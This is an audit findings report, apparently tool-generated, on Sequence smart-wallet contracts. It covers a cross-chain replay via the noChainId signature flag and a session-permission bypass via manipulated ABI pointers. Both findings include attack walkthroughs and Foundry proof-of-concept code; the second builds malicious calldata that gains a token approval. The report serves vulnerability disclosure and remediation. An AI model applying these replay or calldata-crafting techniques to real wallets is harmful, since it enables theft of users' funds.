# 2025 10 sequence - Findings Report
## Commit hash: b0e5fb15bf6735ec9aaba02f5eca28a7882d815d

##Findings by Pattern


 **Derived From** : Cross-Chain Replay Vulnerability via `noChainId` Signature Flag

[M-1]. `noChainId` flag lets any observer replay a signed wallet transaction on every chain where the wallet exists
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : Session Permission Bypass via Dynamic ABI Encoding Manipulation

[H-2]. Explicit session ParameterRule checks can be bypassed for dynamic bytes arguments via manipulated ABI pointers, enabling privilege escalation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresRole


### Number of Findings
- C: 0
- H: 1
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Cross-Chain Replay Vulnerability via `noChainId` Signature Flag

## [M-1]. `noChainId` flag lets any observer replay a signed wallet transaction on every chain where the wallet exists

### Finding Severity Justification: The finding demonstrates a violation of the explicit 'Domain-Separated Signatures' invariant listed in the audit scope. By allowing the 'noChainId' flag on 'KIND_TRANSACTIONS' payloads, the protocol permits cross-chain replay of value-bearing transactions. While the user must sign the specific chain-agnostic hash, the lack of protocol-level restrictions on this dangerous flag for transaction payloads constitutes a significant design flaw and security risk.
## Derived From Pattern/Invariant
Cross-Chain Replay Vulnerability via `noChainId` Signature Flag

## Exploit Type
ReplayAttack

## Location
Calls.execute

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The wallet’s EIP‑712 domain separator can be configured to ignore the current `chainId` when the signature’s `noChainId` flag is set. This makes the signed digest identical across all chains for the same wallet address, breaking the stated invariant that signatures are network-specific.

Relevant code:

1) The domain separator ignores `block.chainid` when `_noChainId` is true:

```solidity
// Payload.sol
function domainSeparator(bool _noChainId, address _wallet) internal view returns (bytes32 _domainSeparator) {
  return keccak256(
    abi.encode(
      EIP712_DOMAIN_TYPEHASH,
      EIP712_DOMAIN_NAME_SEQUENCE,
      EIP712_DOMAIN_VERSION_SEQUENCE,
      _noChainId ? uint256(0) : uint256(block.chainid),
      _wallet
    )
  );
}

function hash(Decoded memory _decoded) internal view returns (bytes32) {
  bytes32 domain = domainSeparator(_decoded.noChainId, address(this));
  bytes32 structHash = toEIP712(_decoded);
  return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
}
```

2) `BaseSig.recover` sets the `noChainId` flag based on the signature’s first byte, for all payload kinds including `KIND_TRANSACTIONS`:

```solidity
// BaseSig.sol
function recover(
  Payload.Decoded memory _payload,
  bytes calldata _signature,
  bool _ignoreCheckpointer,
  address _checkpointer
) internal view returns (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint, bytes32 opHash) {
  (uint256 signatureFlag, uint256 rindex) = _signature.readFirstUint8();
  ...
  // If the signature type is 10 we do a no chain id signature
  _payload.noChainId = signatureFlag & 0x02 == 0x02;
  ...
  opHash = _payload.hash();
}
```

3) `Calls.execute` relies on that `opHash` for authentication, without restricting use of `noChainId` to configuration updates or special flows:

```solidity
// Calls.sol
function execute(bytes calldata _payload, bytes calldata _signature) external payable nonReentrant {
  uint256 startingGas = gasleft();
  Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);

  _consumeNonce(decoded.space, decoded.nonce);
  (bool isValid, bytes32 opHash) = signatureValidation(decoded, _signature);
  if (!isValid) revert InvalidSignature(decoded, _signature);
  _execute(startingGas, opHash, decoded);
}
```

Because `domainSeparator` uses `0` as the `chainId` whenever `noChainId` is set, the EIP‑712 digest for a given payload is identical across all EVM chains, as long as the verifying contract address is the same. Sequence wallets are deployed deterministically via `CREATE2`, so a given configuration naturally corresponds to the same wallet address on every chain. As a result, any valid signature produced with the `noChainId` flag can be replayed on every chain where that wallet exists and has the same nonce.

Nonces do not prevent cross-chain replay: nonce state is per-chain (stored in the wallet’s own storage), so a freshly deployed wallet has `nonce=0` on each chain. A single signature over `(space, nonce=0, payload)` with `noChainId` set can therefore be executed once per chain by anyone who learns the signature.

This contradicts the stated invariant that “all signatures are domain-separated and network-specific,” and enables a cross-chain replay of arbitrary wallet transactions whenever a signer (or SDK) opts into the `noChainId` mode.

## Impact
If a wallet owner (or SDK) ever signs a `KIND_TRANSACTIONS` payload with the `noChainId` flag set, that same signature can be replayed on every chain where the wallet address exists and the nonce matches. An attacker who observes the signature on one chain can submit it on another chain to repeat the transaction without further authorization. This can be used to repeatedly execute value-bearing operations (ETH transfers, token transfers, approvals, contract interactions) once per chain, leading to unexpected or duplicated asset movements and potential multi-chain loss (e.g. double-initiated bridges, duplicated swaps, repeated approvals).

## Command to Run Test


## Proof of Concept
1. A user has a Sequence wallet deployed on two chains, L1 and L2, with the same address via CREATE2 (standard Sequence setup).
2. On both chains, the wallet is fresh in nonce space 0: `readNonce(0) == 0` on L1 and L2.
3. The user (or their SDK) constructs a `KIND_TRANSACTIONS` payload in nonce space 0, nonce 0, e.g. a single call transferring 10 ETH to some recipient.
4. The signature is encoded with the top-level `signatureFlag` having bit 1 set (`0x02`), i.e. `noChainId = true`.
5. The user (or an honest relayer) submits this payload+signature to `wallet.execute` on L1. Inside the wallet:
   - `decoded.noChainId` is set to true by `BaseSig.recover`.
   - `opHash = Payload.hash(decoded)` uses `chainId=0` in the EIP-712 domain, not L1’s actual `chainId`.
   - `_consumeNonce(0, 0)` passes and increments the L1 nonce to 1.
   - The 10 ETH transfer executes on L1.
6. The transaction and raw signature are now public on L1. An attacker copies the `_payload` and `_signature` bytes.
7. On L2, the wallet at the same address still has `readNonce(0) == 0` (no previous transactions). The attacker calls `wallet.execute(_payload, _signature)` on L2.
8. On L2:
   - `BaseSig.recover` again sets `decoded.noChainId = true`.
   - `Payload.hash(decoded)` recomputes the same `opHash` as on L1 because the domain uses `chainId=0` for noChainId, ignoring L2’s actual `chainId`.
   - The signature verifies against the same `opHash`.
   - `_consumeNonce(0, 0)` passes on L2 (nonce was 0), then increments it to 1.
   - The wallet executes the identical call again, e.g. sending another 10 ETH to the same recipient, but now on L2.
9. The attacker has replayed the user’s signed transaction onto a second chain without the user signing anything else. If the payload performed a bridge withdraw, swap, or token approval, this behavior can cause duplicated cross-chain effects or asset loss on multiple networks.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Payload} from "src/modules/Payload.sol";

contract NoChainIdReplayTest is Test {
    function testNoChainIdHashIsChainIndependent() public {
        // Build a minimal transaction payload in memory
        Payload.Call[] memory calls = new Payload.Call[](1);
        calls[0] = Payload.Call({
            to: address(0x1234),
            value: 0,
            data: "",
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: 0
        });

        address[] memory parents = new address[](0);

        Payload.Decoded memory dec = Payload.Decoded({
            kind: Payload.KIND_TRANSACTIONS,
            noChainId: true, // critical: opt into noChainId mode
            calls: calls,
            space: 0,
            nonce: 0,
            message: "",
            imageHash: bytes32(0),
            digest: bytes32(0),
            parentWallets: parents
        });

        // On chainId 1, compute the EIP-712 hash
        vm.chainId(1);
        bytes32 h1 = Payload.hash(dec);

        // On chainId 2, compute the EIP-712 hash again
        vm.chainId(2);
        bytes32 h2 = Payload.hash(dec);

        // Because dec.noChainId == true, the domain uses chainId = 0,
        // so h1 == h2 even though the underlying chainId changed.
        assertEq(h1, h2, "noChainId payload hash should be identical across chainIds");

        // Control: if we disable noChainId, the hashes must differ across chains
        dec.noChainId = false;
        vm.chainId(1);
        bytes32 h3 = Payload.hash(dec);
        vm.chainId(2);
        bytes32 h4 = Payload.hash(dec);
        assertTrue(h3 != h4, "normal payload hash should depend on chainId");
    }
}


## Suggested Mitigation
Restrict or specialize the `noChainId` mode so it cannot be used for arbitrary `KIND_TRANSACTIONS` payloads:

1. **Protocol-level guard:** In `BaseSig.recover` (or in `signatureValidation`), reject signatures with `noChainId` set when `_payload.kind == Payload.KIND_TRANSACTIONS`. Reserve `noChainId` for specific payload kinds such as `KIND_CONFIG_UPDATE` or `KIND_MESSAGE` where cross-chain replay is intentional and safe.

   ```solidity
   // Pseudocode inside BaseSig.recover or BaseAuth.signatureValidation
   if (_payload.kind == Payload.KIND_TRANSACTIONS && (signatureFlag & 0x02 == 0x02)) {
       revert("noChainId not allowed for transaction payloads");
   }
   ```

2. **Alternative:** If `noChainId` must be supported for transactions, extend the domain separation with an additional field that distinguishes networks (e.g. a chain-group ID or a checkpointer-specific domain) so that a signature is not valid on arbitrary chains, only on explicitly intended ones.

3. **SDK defenses:** In all official tooling, never set `noChainId` for value-bearing transaction payloads. Restrict its use to configuration updates or explicit multi-chain flows, and surface clear user warnings when it is used.

Any of these changes would restore the invariant that normal wallet transactions are bound to a single chain, preventing unbounded cross-chain replays by observers.





 **Derived From** : Session Permission Bypass via Dynamic ABI Encoding Manipulation

## [H-2]. Explicit session ParameterRule checks can be bypassed for dynamic bytes arguments via manipulated ABI pointers, enabling privilege escalation

### Finding Severity Justification: The vulnerability allows a restricted session key holder (or an attacker with access to one) to bypass permission checks on dynamic parameters (e.g., `bytes` calldata) by manipulating ABI pointers. This enables privilege escalation, allowing the execution of arbitrary function calls (like `approve` or `transfer`) despite the existence of restrictive rules intended to prevent them. This constitutes a complete bypass of the authorization layer for explicit sessions involving dynamic arguments.
## Derived From Pattern/Invariant
Session Permission Bypass via Dynamic ABI Encoding Manipulation

## Exploit Type
AuthByPass

## Location
PermissionValidator.validatePermission

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Explicit sessions rely on PermissionValidator.validatePermission to enforce per-call restrictions based on ParameterRule structs over raw calldata. As described in the documentation, each rule is enforced by reading a 32-byte word from call.data at a fixed byte offset, masking it, and comparing to an expected value:

- Extract value: extracted = call.data.readBytes32(rule.offset)
- Mask: masked = extracted & rule.mask
- Compare masked against rule.value according to rule.operation

This works for static parameters (e.g. address, uint256) whose location in calldata is fixed. However, for dynamic parameters like bytes or bytes[], ABI encoding uses a 32-byte *pointer* in the static head, and the actual data lives in a separate tail region at an offset determined by that pointer. validatePermission has no knowledge of parameter types or ABI pointers; it only sees a raw byte array.

Wallet owners are expected to build ParameterRules that, for example, "check the first 4 bytes of the inner call data" for functions like Router.execute(address target, uint256 value, bytes data) or multicall(bytes[] calls). Off-chain tooling will typically compute the *canonical* offset where that inner data would live under normal ABI encoding (e.g. assume the bytes pointer is 0x60, then data starts at 4 + 0x60 + 32), and set rule.offset to this constant.

A malicious session delegate can craft calldata manually so that:

1) The bytes parameter's 32-byte pointer in the head points to a *different* location (e.g. the end of calldata) where malicious inner data lives.
2) At the fixed offset expected by the owner's rule (based on the canonical pointer), the attacker places a decoy 4-byte selector and arguments that satisfy the ParameterRule (e.g. token.transfer selector and safe params).

PermissionValidator will read the word at the fixed offset rule.offset, see the decoy selector/value, and the rule passes. But when the target contract decodes the call, it reads the pointer from the head and jumps to the attacker-controlled tail region, executing the *malicious* data instead (for example, token.approve(attacker, MAX_UINT)).

Because validatePermission never cross-checks that the pointer used by the ABI decoder matches the assumed static location used by the rule, the rule system cannot safely constrain dynamic parameters. For explicit sessions that grant access to generic routers or multicall-style functions with bytes arguments, this allows a session key delegate to bypass intended restrictions and execute arbitrary methods/targets, effectively upgrading their permissions beyond what the configuration encodes.

Impact example: a wallet owner grants an explicit session key permission to call a router.execute(target, value, bytes data) function with rules intended to restrict data to token.transfer(receiver, amount). Using the pointer-manipulation technique above, the delegate can instead call token.approve(attacker, MAX_UINT) while still satisfying all configured ParameterRules. Once the allowance is in place, the attacker can drain all of the wallet's ERC20 balance using a separate transferFrom, completely bypassing the session's intended safety limits.

## Impact
A restricted explicit session key delegate can escalate their privileges and execute arbitrary calls via routers or multicall-style contracts, despite seemingly strict ParameterRules, enabling unauthorized approvals or transfers of the wallet's ERC20 funds.

## Command to Run Test


## Proof of Concept
High-level attack scenario:

1) Wallet configuration
   - The wallet's imageHash includes a sapient signer leaf for the SessionManager contract with weight equal to the global threshold, so any signature recovered via SessionManager.recoverSapientSignature is sufficient to authorize a wallet operation.
   - The owner creates an explicit session for delegate D (an EOA) via SessionManager, with SessionPermissions configured as follows:
     - signer = D
     - target permission: Router.execute(address target, uint256 value, bytes data)
     - ParameterRule #0: at the offset of the first argument, enforce target == TOKEN (the ERC20 contract).
     - ParameterRule #1: at some precomputed constant offset innerOffset, enforce that the first 4 bytes of the bytes data equal TOKEN.transfer.selector. The owner/tooling computes innerOffset assuming canonical ABI encoding where the bytes pointer is 0x60 and the data begins at 4 + 0x60 + 32.
     - Optionally, additional rules constrain value and recipient, but all use fixed offsets into call.data.

2) Delegate D crafts malicious calldata for Router.execute
   - Instead of using standard ABI encoding, D manually builds call data for Router.execute with the following layout:
     - At call.data[4..36]: target = TOKEN.
     - At call.data[36..68]: value = 0.
     - At call.data[68..100]: bytes pointer p is set to a value that does NOT equal the canonical 0x60, e.g. p = 0xa0.
     - At the canonical innerOffset (the offset the owner assumed for the inner bytes under p = 0x60), D writes a decoy region: a 32-byte length, followed by a word containing TOKEN.transfer.selector and benign arguments, so that reading 32 bytes at innerOffset yields a value matching the owner's rule (after masking).
     - At the *actual* location 4 + p (4 + 0xa0), D places the real dynamic area: a length plus bytes encoding TOKEN.approve(attacker, MAX_UINT) or any other malicious inner call.

3) Signature and session validation
   - D signs the payload (containing the Router.execute call) with their session key and encodes it as a SessionSig.DecodedSignature.
   - BaseSig.recover encounters a sapient signer leaf for SessionManager and calls SessionManager.recoverSapientSignature(payload, encodedSignature).
   - SessionManager loops over the payload calls and for the Router.execute call invokes _validateExplicitCall, which in turn calls PermissionValidator.validatePermission with the configured Permission and the crafted Payload.Call.
   - validatePermission applies ParameterRule #0: it reads call.data at the address-of-target offset and sees TOKEN, so the rule passes.
   - For ParameterRule #1, it reads a 32-byte word from call.data at the fixed innerOffset, masks it, and compares to the expected transfer selector. Because D placed a decoy transfer selector there, the rule passes even though the bytes pointer in the head points elsewhere.
   - No rule ever inspects the pointer in the head or the actual bytes at 4 + p, so validatePermission concludes the call is authorized and returns (true, updatedLimits).
   - SessionManager aggregates limits, returns its imageHash, and BaseSig counts the sapient signer weight towards the wallet threshold.

4) Execution and theft
   - The relayer or EntryPoint calls Stage2Module.execute (or executeUserOp -> selfExecute) on the wallet with the same payload and the sapient session signature.
   - Calls._execute sees a single call to Router.execute and performs a low-level call to the Router.
   - The Router decodes its arguments using standard ABI rules:
     - Reads the pointer p from the head at offset 68.
     - Jumps to 4 + p (4 + 0xa0) to load the dynamic bytes.
     - Sees the bytes encoding TOKEN.approve(attacker, MAX_UINT) and executes that call.
   - The wallet now has granted attacker an unlimited allowance on TOKEN, which the attacker can immediately drain with transferFrom in a separate transaction.

Throughout this flow, all explicit session checks in SessionManager and PermissionValidator have passed, because they only looked at fixed offsets in call.data and never validated the ABI pointer or the actual dynamic region used by the callee.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

/// Minimal router/multicall-style target used in the PoC
contract Router {
    function execute(address target, uint256 value, bytes calldata data) external {
        (bool ok,) = target.call{value: value}(data);
        require(ok, "router call failed");
    }
}

/// Minimal ERC20-like token with transfer and approve
contract ERC20Like {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// Mini-validator that mimics the relevant part of PermissionValidator
contract MiniValidator {
    // Check that the 4-byte word at `offset` in `data` equals `expectedSelector`.
    function check(bytes calldata data, uint256 offset, bytes4 expectedSelector) external pure returns (bool) {
        bytes4 sel;
        assembly {
            // data.offset points to the start of the bytes payload in calldata
            // We want to read at absolute offset `offset` relative to the payload start
            let word := calldataload(add(data.offset, offset))
            sel := shr(224, word) // top 4 bytes
        }
        return sel == expectedSelector;
    }
}

contract DynamicAbiBypassTest is Test {
    Router router;
    ERC20Like token;
    MiniValidator validator;

    address wallet = address(0xBEEF);
    address attacker = address(this);

    function setUp() public {
        router = new Router();
        token = new ERC20Like();
        validator = new MiniValidator();

        token.mint(wallet, 1e18);
    }

    function testDynamicAbiPointerBypassesSelectorRule() public {
        // Owner's tooling assumes canonical ABI encoding for
        // Router.execute(address target, uint256 value, bytes data)
        // Canonical Pointer p = 0x60 (96)
        // Data Length offset = 4 + 96 = 100
        // Data Content offset = 100 + 32 = 132
        // The rule expects the selector at offset 132.
        uint256 assumedInnerSelectorOffset = 132;

        // Build malicious Router.execute calldata
        bytes memory malicious = _buildMaliciousExecuteCall(assumedInnerSelectorOffset);

        // 1. Validator Check: mimics PermissionValidator reading at the fixed offset (132)
        // This should PASS because we placed a decoy transfer selector there.
        bool rulePasses = validator.check(malicious, assumedInnerSelectorOffset, token.transfer.selector);
        assertTrue(rulePasses, "fixed-offset selector rule should pass on decoy data");

        // 2. Execution Check: mimics the wallet calling the Router
        // The Router ABI decoder follows the pointer (0xa0) to the REAL data (approve)
        vm.prank(wallet);
        (bool ok,) = address(router).call(malicious);
        assertTrue(ok, "router execute call failed");

        // 3. Impact Check: Attacker gains allowance despite the rule
        assertEq(token.allowance(wallet, attacker), 1e18, "attacker should gain allowance via approve()");
    }

    function _buildMaliciousExecuteCall(uint256 decoyOffset) internal view returns (bytes memory data) {
        address _token = address(token);
        address _attacker = address(attacker);
        bytes4 execSel = Router.execute.selector;
        bytes4 transferSel = token.transfer.selector;
        bytes4 approveSel = token.approve.selector;

        // We construct a payload larger than standard to accommodate the shift.
        // Standard head: 4 + 3*32 = 100 bytes.
        // We move the pointer to 0xa0 (160).
        // Real tail starts at 4 + 160 = 164.
        // Real tail size = 32 (len) + 4 (sel) + 32 (spender) + 32 (amt) = 100 bytes.
        // Total size needed approx 264 bytes.
        data = new bytes(300);

        uint256 p = 0xa0; // manipulated pointer

        assembly {
            let base := add(data, 32)

            // --- HEAD ---
            // [0..3] Selector
            mstore(base, shl(224, execSel))
            // [4..35] Arg0: target
            mstore(add(base, 4), shl(96, _token))
            // [36..67] Arg1: value
            mstore(add(base, 36), 0)
            // [68..99] Arg2: bytes pointer
            mstore(add(base, 68), p)

            // --- DECOY REGION ---
            // The validator expects the selector at `decoyOffset` (132).
            // We write the transfer selector there.
            let decoyLoc := add(base, decoyOffset)
            mstore(decoyLoc, shl(224, transferSel))

            // Optionally, we can write a fake length before it at 100 for completeness,
            // though the validator relies on the offset 132.
            mstore(add(base, 100), 4)

            // --- REAL DYNAMIC REGION ---
            // The ABI decoder looks at 4 + p = 164.
            let realLoc := add(base, add(4, p))

            // Length of inner calldata: 4 + 32 + 32 = 68 (0x44)
            mstore(realLoc, 0x44)

            // Inner Data: approve(attacker, 1e18)
            mstore(add(realLoc, 32), shl(224, approveSel))
            mstore(add(realLoc, 36), shl(96, _attacker))
            mstore(add(realLoc, 68), 1000000000000000000)
            
            // Update free memory pointer if strictly needed, but bytes memory allocation handles it.
        }
    }
}

## Suggested Mitigation
PermissionValidator should not rely solely on fixed byte offsets into raw calldata for dynamic parameters, as the ABI encoding of dynamic types allows the data location to vary via pointers. To prevent this bypass, implement one of the following:

1.  **Pointer Consistency Check:** If a ParameterRule targets a dynamic type (e.g., bytes), the validator must also verify that the ABI pointer in the calldata head corresponds to the expected canonical offset (e.g., `headSize + previousArgsSize`). If the pointer does not match, the transaction should revert.
2.  **Type-Aware Decoding:** Instead of raw masking, decode the calldata using `abi.decode` based on the function selector, and apply rules to the decoded values. This ensures the validator and the execution layer see the same data.

Immediate fix: Update `PermissionValidator` to reject rules checking offsets beyond the static head unless the corresponding dynamic pointer is also explicitly constrained to the canonical value.



